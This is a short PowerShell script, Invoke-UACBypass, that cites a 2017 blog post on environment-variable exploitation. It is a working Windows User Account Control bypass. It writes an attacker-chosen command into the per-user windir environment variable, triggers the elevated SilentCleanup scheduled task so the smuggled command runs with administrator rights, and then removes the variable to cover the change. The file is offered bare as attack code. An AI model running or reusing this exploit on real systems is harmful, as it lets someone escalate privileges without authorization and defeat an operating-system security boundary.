# https://tyranidslair.blogspot.co.uk/2017/05/exploiting-environment-variables-in.html

Function Invoke-UACBypass {
param($cmd='reg delete hkcu\Environment /v windir /f')

    Set-ItemProperty -Path HKCU:\Environment -Name windir -Value "cmd /K $cmd && REM" -Force
    Start-ScheduledTask -TaskPath Microsoft\Windows\DiskCleanup -TaskName SilentCleanup
    Remove-ItemProperty -Path HKCU:\Environment -Name windir -Force

}
